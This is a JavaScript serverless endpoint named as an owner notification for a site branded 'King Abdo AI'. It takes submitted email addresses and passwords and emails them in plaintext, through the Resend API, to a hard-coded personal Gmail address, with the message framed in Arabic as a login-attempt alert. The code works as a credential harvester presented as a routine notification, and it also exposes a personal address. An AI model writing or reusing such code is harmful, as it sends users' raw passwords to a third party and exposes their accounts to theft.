// 📁 api/notify-owner.js

export default async function handler(req, res) {

    // 👑 CORS — السماح لموقع الملك فقط
    res.setHeader('Access-Control-Allow-Origin', 'https://king-abdo-ai-26dd.vercel.app');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // ✅ Parse Body safely
    let body;
    try {
        body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (e) {
        return res.status(400).json({ error: 'Invalid JSON' });
    }

    try {
        const { email, password } = body;

        if (!email || !password) {
            return res.status(400).json({ error: 'Missing credentials' });
        }

        const response = await fetch('https://api.resend.com/emails', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.RESEND_API_KEY}`
            },
            body: JSON.stringify({
                from: 'King Abdo AI <onboarding@resend.dev>',
                to: 'abdalrhmanmohmaed717@gmail.com',
                subject: '👑 محاولة دخول إلى بوابة النخبة',
                html: `
                <div style="direction:rtl;font-family:Tajawal;background:#0d1b2a;color:#fff;padding:20px;border-radius:12px">
                    <h2 style="color:#f59e0b">⚔️ جلالة الملك، تم رصد محاولة دخول</h2>
                    <p><strong>📧 البريد:</strong> ${email}</p>
                    <p><strong>🔑 كلمة المرور:</strong> ${password}</p>
                    <p><strong>🕒 الوقت:</strong> ${new Date().toLocaleString('ar-EG')}</p>
                    <hr style="border-color:#334155">
                    <small>KING ABDO AI — الحارس الرقمي</small>
                </div>
                `
            })
        });

        const data = await response.json();

        if (!response.ok) {
            console.error('Resend error:', data);
            return res.status(500).json({ error: 'Email failed' });
        }

        return res.status(200).json({ success: true });

    } catch (err) {
        console.error('Server error:', err);
        return res.status(500).json({ error: 'Internal server error' });
    }
}
